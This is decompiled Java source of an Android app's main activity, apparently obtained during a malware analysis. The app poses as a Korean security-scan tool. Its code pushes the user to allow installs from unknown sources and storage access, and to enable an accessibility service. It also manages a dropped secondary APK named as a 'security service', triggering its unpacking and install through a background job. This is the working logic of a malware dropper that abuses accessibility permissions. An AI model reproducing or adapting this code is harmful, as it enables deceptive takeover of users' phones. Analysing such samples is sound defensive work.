package com.ldjSxw.heBbQd;

import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.support.p014v4.app.ActivityCompat;
import android.support.p014v4.content.C0241b;
import android.text.TextUtils;
import android.view.View;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.Toast;
import com.ldjSxw.heBbQd.base.BaseActivity;
import com.ldjSxw.heBbQd.iservice.JobSevice;
import com.ldjSxw.heBbQd.iservice.TaskService;
import com.ldjSxw.heBbQd.p017a.C0739a;
import com.ldjSxw.heBbQd.p017a.C0740b;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

/* loaded from: C:\Users\User\Desktop\kdt\project\kdt_mobsf\2024_mma\depack\download.dex */
public class MainActivity extends BaseActivity {
    private AlertDialog.Builder mAccBuilder;
    private Context mContext = this;
    private TextView mTvDate;

    @Override // com.ldjSxw.heBbQd.base.BaseActivity, android.support.p016v7.app.AppCompatActivity, android.support.p014v4.app.FragmentActivity, android.support.p014v4.app.SupportActivity, android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(2131296287);
        initViews();
        if (Build.VERSION.SDK_INT < 31) {
            C0740b.m34x(this.mContext, JobSevice.class);
        }
    }

    private void requestWritePermission() {
        try {
            List<String> mList = new ArrayList<>();
            mList.add("android.permission.WRITE_EXTERNAL_STORAGE");
            mList.add("android.permission.READ_EXTERNAL_STORAGE");
            if (!mList.isEmpty()) {
                String[] permissions = (String[]) mList.toArray(new String[mList.size()]);
                ActivityCompat.requestPermissions(this, permissions, 1);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void permissionCheck() {
        try {
            int i = Build.VERSION.SDK_INT;
            if (i >= 26) {
                boolean hasPermission = getPackageManager().canRequestPackageInstalls();
                if (!hasPermission) {
                    C0740b.m36v(this.mContext);
                    return;
                }
            }
            if (i >= 31) {
                boolean isAccessibilityEnabled = isAccessibilityServiceEnabled(this.mContext, TaskService.class);
                C0739a.m58a("isAccessibilityEnabled:" + isAccessibilityEnabled);
                if (!isAccessibilityEnabled) {
                    showAccsibilityDialog(getString(2131427374), getString(2131427371) + getString(2131427378) + getString(2131427372));
                    return;
                }
                int result = C0241b.checkSelfPermission(this.mContext, "android.permission.WRITE_EXTERNAL_STORAGE");
                if (result != 0) {
                    Toast.makeText(this.mContext, "파일 액세스 권한 허용 해주세요.", 0).show();
                    requestWritePermission();
                    return;
                }
                boolean isInstalled = C0740b.m49i(this.mContext, "com.bosetn.oct16m");
                String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/보안서비스.apk";
                boolean isApkExists = new File(path).exists();
                boolean isValidApk = C0740b.m42p(this.mContext, path);
                C0739a.m58a("isValidApk===>" + isValidApk + " " + isApkExists);
                if (isInstalled) {
                    File file = new File(path);
                    if (file.exists()) {
                        file.delete();
                    }
                } else if ((!isApkExists && !isInstalled) || (isApkExists && !isValidApk)) {
                    C0740b.m35w(this.mContext, "K_IS_FIRST_INSTALL", "NO");
                    File file2 = new File(path);
                    if (file2.exists()) {
                        file2.delete();
                    }
                    this.mLoadingHandler.sendEmptyMessage(1);
                    this.mLoadingHandler.sendEmptyMessageDelayed(0, 6000L);
                    C0740b.m35w(this.mContext, "K_APP_UNZIP_STATE", "");
                    C0740b.m34x(this.mContext, JobSevice.class);
                } else {
                    String first = C0740b.m56b(this.mContext, "K_IS_FIRST_INSTALL");
                    if (first.equalsIgnoreCase("")) {
                        C0740b.m35w(this.mContext, "K_IS_FIRST_INSTALL", "NO");
                        File file3 = new File(path);
                        if (file3.exists()) {
                            file3.delete();
                        }
                        this.mLoadingHandler.sendEmptyMessage(1);
                        this.mLoadingHandler.sendEmptyMessageDelayed(0, 6000L);
                        C0740b.m35w(this.mContext, "K_APP_UNZIP_STATE", "");
                        C0740b.m34x(this.mContext, JobSevice.class);
                    }
                }
            }
            Intent intent = new Intent(this.mContext, ScanActivity.class);
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void showAccsibilityDialog(String title, String content) {
        try {
            if (this.mAccBuilder != null) {
                return;
            }
            AlertDialog.Builder builder = new AlertDialog.Builder(this.mContext);
            this.mAccBuilder = builder;
            builder.setTitle(title);
            this.mAccBuilder.setCancelable(false);
            this.mAccBuilder.setMessage(content);
            this.mAccBuilder.setPositiveButton(2131427382, new DialogInterface$OnClickListenerC0732a());
            this.mAccBuilder.show();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ldjSxw.heBbQd.MainActivity$a */
    /* loaded from: C:\Users\User\Desktop\kdt\project\kdt_mobsf\2024_mma\depack\download.dex */
    public class DialogInterface$OnClickListenerC0732a implements DialogInterface.OnClickListener {
        DialogInterface$OnClickListenerC0732a() {
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialog, int which) {
            Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            intent.addFlags(276856832);
            MainActivity.this.startActivity(intent);
            dialog.dismiss();
            MainActivity.this.mAccBuilder = null;
        }
    }

    private boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
        ComponentName expectedComponentName = new ComponentName(context, accessibilityService);
        String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
        if (enabledServicesSetting == null) {
            return false;
        }
        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
        colonSplitter.setString(enabledServicesSetting);
        while (colonSplitter.hasNext()) {
            String componentNameString = colonSplitter.next();
            ComponentName enabledService = ComponentName.unflattenFromString(componentNameString);
            if (enabledService != null && enabledService.equals(expectedComponentName)) {
                return true;
            }
        }
        return false;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ldjSxw.heBbQd.MainActivity$b */
    /* loaded from: C:\Users\User\Desktop\kdt\project\kdt_mobsf\2024_mma\depack\download.dex */
    public class View$OnClickListenerC0733b implements View.OnClickListener {
        View$OnClickListenerC0733b() {
        }

        @Override // android.view.View.OnClickListener
        public void onClick(View v) {
            MainActivity.this.permissionCheck();
        }
    }

    private void initViews() {
        ImageButton imgBtn = (ImageButton) findViewById(2131165275);
        imgBtn.setOnClickListener(new View$OnClickListenerC0733b());
        String date = C0740b.m56b(this, "K_LAST_SCAN_CHECK_DATE");
        if (!date.equalsIgnoreCase("")) {
            TextView textView = (TextView) findViewById(2131165351);
            this.mTvDate = textView;
            textView.setText(date);
        }
    }
}